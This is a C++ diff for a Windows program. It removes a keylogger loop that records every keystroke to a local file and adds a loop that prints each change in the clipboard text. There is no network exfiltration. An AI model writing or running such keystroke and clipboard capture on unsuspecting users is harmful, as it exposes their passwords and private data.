@@ -76,80 +76,20 @@ bool SpecialKeys(int S_Key) {
 }
 
 int main() {
-	//std::string data;
-	const char* m_psz;
-	char last[2] = {0, 0};
-
-	while (1) {
-		//ActivateKeyboardLayout();
-		Sleep(15);
-		/*std::cout << GetAsyncKeyState(16);
-		continue;*/
-
-		for (unsigned char i = 0; i < 256; i++) {
-			//std::cout << i << std::endl;
-			if (GetAsyncKeyState(i) == -32767) {
-				if (SpecialKeys(i) == false) {
-					/*if (GetAsyncKeyState(16) == -32767) {
-						std::cout << char(i);
-
-						std::fstream LogFile;
-						LogFile.open("F:\\dat.txt", std::ifstream::app);
-						if (LogFile.is_open()) {
-							LogFile << char(i);
-							LogFile.close();
-						}
-					}*/
-
-					std::string Name(1, i);
-					std::transform(Name.begin(), Name.end(), Name.begin(), ::tolower);
-					std::cout << Name;
-
-					std::fstream LogFile;
-					LogFile.open("F:\\dat.txt", std::ifstream::app);
-					if (LogFile.is_open()) {
-						LogFile << Name;
-						LogFile.close();
-					}
-				}
-				/*if (i == 16) {
-					last[0] = 1;
-				}
-
-				if ((last[0] == 1) && (i != 16)) {
-					std::cout << i;
-					last[0] = 0;
-					break;
-				}
-				std::string Name(1, i);
-				std::transform(Name.begin(), Name.end(), Name.begin(), ::tolower);
-				std::cout << Name;
-				break;*/
-				/*if (SpecialKeys(i) == false) {
-
-					std::ifstream LogFile;
-					LogFile.open("dat.txt", std::ifstream::app);
-					if (LogFile.is_open()) {
-						LogFile << char(i);
-						LogFile.close();
-					}
-
-				}*/
-			}
-		}
-		//return 0;
-	}
+	std::string ClipboardText[2];
+	char last[2] = { 0, 0 };
 
 	for (;;) {
-		if (1 == 1) {
-			OpenClipboard(0);
-			HANDLE hData = GetClipboardData(CF_TEXT);
-			m_psz = static_cast<const char*>(GlobalLock(hData));
-			//GlobalUnlock(hData);
-			CloseClipboard();
-
-			std::cout << m_psz << std::endl;
+		Sleep(500);
+		OpenClipboard(0);
+		HANDLE hData = GetClipboardData(CF_TEXT);
+		ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
+		//GlobalUnlock(hData);
+		if (ClipboardText[0] != ClipboardText[1]) {
+			ClipboardText[0] = ClipboardText[1];
+			std::cout << ClipboardText[1] << std::endl;
 		}
+		CloseClipboard();
 	}
 	return 0;
 }
